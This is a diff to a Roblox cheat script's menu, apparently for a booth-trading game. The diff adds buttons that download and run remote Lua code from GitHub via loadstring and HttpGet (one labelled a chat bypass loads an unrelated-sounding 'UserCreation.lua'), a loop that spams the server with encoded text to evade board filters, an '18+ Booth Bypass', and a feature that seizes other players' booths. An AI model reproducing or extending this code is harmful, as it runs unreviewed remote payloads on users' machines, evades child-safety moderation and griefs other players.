@@ -850,39 +850,27 @@ end
 end
 end})
 
-Tab4:AddTextbox({
-Name = "Chat Bypass (Patched! Reworking)",
-Default = "Bypass Text",
-TextDisappear = true,
-Callback = function(Bypass)
-local letters = {
-    ["A"] = "🅰", ["a"] = "🅰", ["B"] = "🅱", ["b"] = "🅱", ["C"] = "🅲", ["c"] = "🅲", ["D"] = "🅳", ["d"] = "🅳", ["E"] = "🅴", ["e"] = "🅴", ["F"] = "🅵", ["f"] = "🅵", ["G"] = "🅶", ["g"] = "🅶", ["H"] = "🅷", ["h"] = "🅷", ["I"] = "🅸", ["i"] = "🅸", ["J"] = "🅹", ["j"] = "🅹", ["K"] = "🅺", ["k"] = "🅺", ["L"] = "🅻", ["l"] = "🅻", ["M"] = "🅼", ["m"] = "🅼", ["N"] = "🅽", ["n"] = "🅽", ["O"] = "🅾", ["o"] = "🅾", ["P"] = "🅿", ["p"] = "🅿", ["Q"] = "🆀", ["q"] = "🆀", ["R"] = "🆁", ["r"] = "🆁", ["S"] = "🆂", ["s"] = "🆂", ["T"] = "🆃", ["t"] = "🆃", ["U"] = "🆄", ["u"] = "🆄", ["V"] = "🆅", ["v"] = "🆅", ["W"] = "🆆", ["w"] = "🆆", ["X"] = "🆇", ["x"] = "🆇", ["Y"] = "🆈", ["y"] = "🆈", ["Z"] = "🆉", ["z"] = "🆉", [" "] = " "
-}
+Tab4:AddButton({
+Name = "Chat Bypass 2",
+Callback = function()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua"))({
+        Settings = {
+            Mode = "Normal",
+            Keybind = "RightControl",
+            CustomBypasses = {}
+        }
+    })
+end})
 
-local function replace(str, find_str, replace_str) 
-    local escaped_find_str = find_str:gsub("[%-%^%$%(%)%%%.%[%]%*%+%-%?]", "%%%0") 
-    return str:gsub(escaped_find_str, replace_str) 
-end
-
-local function filter(message)
-    for search, replacement in pairs(letters) do
-        message = replace(message, search, replacement)
-    end
-    return message
-end
-
-local function SendMSG(msg)
-    local TextChat = game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
-
-    TextChat:SendAsync(filter(msg))
-end
-
-SendMSG(Bypass)
+Tab4:AddButton({
+Name = "Chat Bypass 3",
+Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/devilschatbypasser/main/MAIN"))();
 end})
 
 Tab7:AddTextbox({
 Name = "18+ Booth Bypass",
-Default = "Text You Want",
+Default = "Booth Text",
 TextDisappear = true,
 Callback = function(TextHereForBooth)
 local function getStall()
@@ -941,8 +929,8 @@ end
 end})
 
 Tab1:AddTextbox({
-Name = "UnClaim Someones Booth",
-Default = "Username or Display",
+Name = "UnClaim A Booth",
+Default = "UserName or Display",
 TextDisappear = true,
 Callback = function(LolUnClaim)
 local OldestCF = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
@@ -988,9 +976,9 @@ end
 local localPlayer = Players.LocalPlayer
 
 for _, player in pairs(Players:GetPlayers()) do
-if player ~= localPlayer and player.Character then
-    makeInvisible(player.Character)
-end
+    if player ~= localPlayer and player.Character then
+        makeInvisible(player.Character)
+    end
 end
 local Proximity1 = getStallFunc():FindFirstChild("ProxPart").ProximityPrompt
 game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(getStallFunc():FindFirstChild("ProxPart").Position)
@@ -1056,6 +1044,29 @@ wait(0.3)
 game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = OldestCF
 else
 return 
+end
+end})
+
+Tab1:AddToggle({
+Name = "Submit Note Bypass (Board)",
+Default = false,
+Callback = function(theNote)
+if theNote then
+getgenv().crazyNote = true
+while getgenv().crazyNote == true do
+wait(.1)
+local args = {
+    [1] = "\211\187\200\149\227\132\136\210\159 \200\159\207\140\200\135"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("SubmitNote"):FireServer(unpack(args))
+end
+else
+getgenv().crazyNote = false
+wait()
+getgenv().crazyNote = false
+wait()
+getgenv().crazyNote = false
 end
 end})
 
@@ -1531,12 +1542,7 @@ end})
 Tab4:AddButton({
 Name = "Chat Bypass (Patched!)",
 Callback = function()
-return OrionLib:MakeNotification({
-    Name = "Sorry!",
-    Content = "This part is undergoing reworking",
-    Image = "rbxassetid://4483345998",
-    Time = 10
-})
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/1price/usercreation/main/UserCreation.lua", true))()
 end})
 
 Tab4:AddButton({
